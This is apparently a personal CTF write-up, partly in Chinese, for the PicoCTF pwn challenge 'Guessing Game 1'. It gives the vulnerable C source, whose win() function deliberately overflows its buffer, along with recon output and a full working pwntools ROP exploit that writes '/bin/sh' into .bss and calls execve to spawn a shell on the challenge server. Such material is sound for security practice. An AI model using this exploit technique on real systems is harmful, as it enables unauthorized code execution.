---
title: PicoCTF - Guessing Game 1
tags: [PicoCTF, CTF, PWN]

category: "Security/Practice/PicoCTF/PWN"
---

# PicoCTF - Guessing Game 1
## Background
ROP Chain
[Linux System Call Table for x86 64](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/)
## Source code
:::spoiler
```cpp
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>

#define BUFSIZE 100


long increment(long in) {
	return in + 1;
}

long get_random() {
	return rand() % BUFSIZE;
}

int do_stuff() {
	long ans = get_random();
	ans = increment(ans);
	int res = 0;
	
	printf("What number would you like to guess?\n");
	char guess[BUFSIZE];
	fgets(guess, BUFSIZE, stdin);
	
	long g = atol(guess);
	if (!g) {
		printf("That's not a valid number!\n");
	} else {
		if (g == ans) {
			printf("Congrats! You win! Your prize is this print statement!\n\n");
			res = 1;
		} else {
			printf("Nope!\n\n");
		}
	}
	return res;
}

void win() {
	char winner[BUFSIZE];
	printf("New winner!\nName? ");
	fgets(winner, 360, stdin);
	printf("Congrats %s\n\n", winner);
}

int main(int argc, char **argv){
	setvbuf(stdout, NULL, _IONBF, 0);
	// Set the gid to the effective gid
	// this prevents /bin/sh from dropping the privileges
	gid_t gid = getegid();
	setresgid(gid, gid, gid);
	
	int res;
	
	printf("Welcome to my guessing game!\n\n");
	
	while (1) {
		res = do_stuff();
		if (res) {
			win();
		}
	}
	
	return 0;
}
```
:::
## Recon
1. Recon
    ```bash!
    $ file vuln
    vuln: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=94924855c14a01a7b5b38d9ed368fba31dfd4f60, not stripped
    $ checksec vuln
    [*] '/mnt/d/NTU/CTF/PicoCTF/PWN/Guessing Game 1/vuln'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
    ```
    可以看到這隻程式沒有用動態連結的方式引入library，代表他都把一些libc會用到的東西編譯進去了
2. 這支程式沒有明顯讀flag的地方，所以可以直覺想到要開shell，而main function的do_stuff subfunction主要應該是類似proof of work的部分(因為亂數的範圍也只要0-99)，當猜對random的數值後就近到win function然後可以填一些東西，達到bof的效果
3. 所以也很直覺的想到one_gadget或是ROP chain的東西，這部分就比較傷腦筋，因為蓋的過程會有一點點繞，講白了這題和[^0x12_rop++]幾乎一模一樣，但因為太久沒看所以忘記了
4. 既然有bof，那我們就可以隨便的蓋rop chain，包括syscall read function，這也說明了如何寫`/bin/sh\x00`的問題
5. ==執行的順序:==
Guess random(PoW)$\to$
syscall __libc_read function$\to$
Input `/bin/sh\x00`$\to$
Return to main function$\to$
Guess random(PoW)$\to$
Syscall `execve` to get shell

Note: 要如何知道`.bss`段在哪裡可以用`readelf -S ./vuln`查看

## Exploit
```python
from pwn import *
import random

# r = process("./vuln")
r = remote("jupiter.challenges.picoctf.org", 39940)

context.arch = "amd64"

'''#############
Read /bin/sh by libc read function
#############'''
r.recvuntil(b'What number would you like to guess?\n')

while(1):
    r.sendline(str(randint(1, 99)).encode())
    tmp = r.recvline().strip().decode()
    print(tmp)
    if tmp != "Nope!":
        success("You got it!!!")
        break
    r.recvuntil(b'What number would you like to guess?\n')

print(r.recvuntil(b'Name? '))

pop_rax_ret = 0x4163f4
pop_rdi_ret = 0x400696
pop_rdx_ret = 0x44a6b5
pop_rsi_ret = 0x410ca3
main_fun_addr = 0x400c8c
libc_read_addr = 0x44a6a0
write_2_bss = 0x6b7000
syscall = 0x40137c

ROP_payload = flat(
    pop_rdi_ret, 0,
    pop_rsi_ret, write_2_bss,
    pop_rdx_ret, 9,
    libc_read_addr,
    main_fun_addr
)
# raw_input()
r.sendline(b'a' * 0x78 + ROP_payload)
r.sendline(b'/bin/sh\x00')

'''#############
Execute shell
#############'''
r.recvuntil(b'What number would you like to guess?\n')

while(1):
    r.sendline(str(randint(1, 99)).encode())
    tmp = r.recvline().strip().decode()
    print(tmp)
    if tmp != "Nope!":
        success("You got it!!!")
        break
    r.recvuntil(b'What number would you like to guess?\n')

print(r.recvuntil(b'Name? '))

ROP_payload = flat(
    pop_rax_ret, 0x3b,
    pop_rdi_ret, write_2_bss,
    pop_rsi_ret, 0,
    pop_rdx_ret, 0,
    syscall
)
# raw_input()
r.sendline(b'a' * 0x78 + ROP_payload)
r.interactive()
```
## Reference
[PicoCTF - Guessing Game 1 [Pwn]](https://cyb3rwhitesnake.medium.com/picoctf-guessing-game-1-pwn-bdc1c87016f9)
[^0x12_rop++]:[Simple PWN - 0x12(Lab - rop++)](https://hackmd.io/@SBK6401/rysBjQfjs)
